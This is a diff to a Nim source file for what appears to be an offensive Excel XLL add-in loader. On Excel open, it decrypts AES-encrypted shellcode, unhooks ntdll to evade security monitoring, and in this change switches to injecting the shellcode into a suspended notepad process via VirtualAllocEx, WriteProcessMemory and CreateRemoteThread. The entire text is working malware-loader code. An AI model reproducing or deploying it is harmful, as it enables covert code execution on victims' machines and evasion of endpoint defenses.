@@ -1,17 +1,12 @@
-#[
-    Compile:
-        nim c -d=mingw --app=lib --nomain --cpu=amd64 nim_xll.nim
-        
-    Will compile as a DLL, you can then just change the extension to .xll
-]#
-
 import nimcrypto
 import base64
 import winim
 import winim/lean
+import osproc
 import strutils
 import ptr_math
 import strformat
+
 
 func toString(bytes: openarray[byte]): string =
     result = newString(bytes.len)
@@ -68,25 +63,57 @@ proc ntdllunhook(): bool =
   return true
 
 
+
+
 proc shellcodeCallback(shellcode: openarray[byte]): void =
 
-    let rPtr = VirtualAlloc(
+    # Taken from OffensiveNim, with only the small edit to the procedure conditions...
+    let tProcess = startProcess("notepad.exe")
+    tProcess.suspend() 
+    defer: tProcess.close()
+
+
+    let pHandle = OpenProcess(
+        PROCESS_ALL_ACCESS, 
+        false, 
+        cast[DWORD](tProcess.processID)
+    )
+    defer: CloseHandle(pHandle)
+
+
+    let rPtr = VirtualAllocEx(
+        pHandle,
         NULL,
         cast[SIZE_T](shellcode.len),
         MEM_COMMIT,
         PAGE_EXECUTE_READ_WRITE
     )
-    # Copy Shellcode to the allocated memory section
-    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len)) 
 
-
-    
-    EnumTimeFormatsEx(
-        cast [TIMEFMT_ENUMPROCEX](rPtr),
-        LOCALE_NAME_SYSTEM_DEFAULT,
-        TIME_NOSECONDS,
-        cast[LPARAM](nil)
+    var bytesWritten: SIZE_T
+    let wSuccess = WriteProcessMemory(
+        pHandle, 
+        rPtr,
+        unsafeAddr shellcode,
+        cast[SIZE_T](shellcode.len),
+        addr bytesWritten
     )
+
+    let tHandle = CreateRemoteThread(
+        pHandle, 
+        NULL,
+        0,
+        cast[LPTHREAD_START_ROUTINE](rPtr),
+        NULL, 
+        0, 
+        NULL
+    )
+    defer: CloseHandle(tHandle)
+
+
+
+
+
+
 
 
 proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
@@ -97,7 +124,7 @@ proc xlAutoOpen() {.stdcall, exportc, dynlib.} =
         var dctx: CTR[aes256]
         var enctext: seq[byte] = toByteSeq(decode(shellcode_base64_encrypted))
         var key: array[aes256.sizeKey, byte]
-        var envkey: string = "ReallyReallyLongAndComplicatedPasswordThatReallyDoesntEvenNeedToBeThatCrazyTbhBecauseWhoIsGonnaReverseItAndTheyWouldntEvenNeedThePassword"
+        var envkey: string = "PASSWORD_ME"
         var iv: array[aes256.sizeBlock, byte]
         var pp: string = decode(encodedIV)
 
